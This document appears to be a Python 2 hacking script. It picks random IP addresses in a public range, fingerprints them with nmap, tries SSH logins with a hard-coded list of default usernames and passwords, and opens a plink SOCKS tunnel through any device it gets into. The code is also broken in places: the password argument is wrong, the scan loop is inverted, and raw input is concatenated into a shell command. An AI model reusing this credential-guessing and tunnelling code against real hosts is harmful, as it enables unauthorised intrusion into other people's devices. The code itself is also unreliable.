# -*- coding: utf-8 -*-
import socket
import nmap
import random
import os
import paramiko
import re
import subprocess
import pyautogui
import time
from selenium import webdriver


default = [("ubuntu", ""), ("admin", "password"), ("admin", "PoopyMonkeys")]


def menu():
    return """1. Get IPs list.
2. Get information about a device.
3. Tunnel through device.
4. Exit.
(1/2/3/4)
"""


def get_list():
    nm = nmap.PortScanner()
    nm.scan()
    return nm.all_hosts()


def get_info():
    ip = raw_input("Insert ip: ")
    return os.system('nmap -O -Pn ' + ip)


def generate_ip():
    str_ip = "77."
    int_ip = random.randint(124, 127)
    str_ip += str(int_ip) + '.'
    int_ip = random.randint(0, 255)
    str_ip += str(int_ip) + '.'
    int_ip = random.randint(0, 255)
    str_ip += str(int_ip)
    print str_ip
    return str_ip


def init_tunnel():
    ssh = paramiko.SSHClient()
    pat = re.compile("Linux")
    ip = generate_ip()
    ops = os.system('nmap -O -Pn ' + ip)
    while re.search(pat, str(ops)) != None:
        ip = generate_ip()
    tunnel(ssh, ip)
    ssh.close()


def tunnel(client, ip):
    try:
        client.connect(ip, port=22, username=default[0][0], password=[0][0])
        stdin, stdout, stderr = client.exec_command('ls')
        print stdout
        print "Connection successful"
    except socket.error:
        tunnel(client, ip)


def handle(ans, client):
    if ans == 1:
        print get_list()
    if ans == 2:
        print get_info()
    if ans == 3:
        init_tunnel()

# def type_credentials(name, password):
#     time.sleep(3)
#     pyautogui.typewrite(name)
#     time.sleep(3)
#     pyautogui.typewrite(password)

def check(ans):
    return ans in [1, 2, 3]

def install_firefox_proxy(PROXY_HOST,PROXY_PORT):
    fp = webdriver.FirefoxProfile()
    fp.set_preference("network.proxy.type", 1)
    fp.set_preference("network.proxy.socks", PROXY_HOST)
    fp.set_preference("network.proxy.socks_port", int(PROXY_PORT))
    fp.set_preference("network.proxy.socks_remote_dns", True)
    fp.update_preferences()
    return webdriver.Firefox(firefox_profile=fp)

def TunnelPuttyLink(ip):
    driver = install_firefox_proxy("127.0.0.1", 3200) # Should be after finding the right ip pass and name
                                                      # but doesn't work
    driver.get('about:config')
    for name, password in default:
        try:
            #os.system("plink -D 3200 -pw %s %s@%s" % (password, name, ip))
            command = "plink -D 3200 -pw %s %s@%s" % (password, name, ip)  # the shell command
            print subprocess.check_output(command)

        except Exception as err:
            print "an error occured: " + str(err)
def main():
#    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#    ans = input(menu())
#    while ans != 4:
#        if check(ans):
#            handle(ans, client)
#        else:
#            print "Invalid request"
#        ans = input(menu())
#    client.close()

    name = "admin"
    password = "PoopyMonkeys"
    ip = "192.168.1.42"
    TunnelPuttyLink(ip)

#    subprocess.call("plink -D 3200 -pw PoopyMonkeys admin@192.168.1.42")
#    type_credentials("admin\n", "PoopyMonkeys\n")


if __name__ == '__main__':
    main()
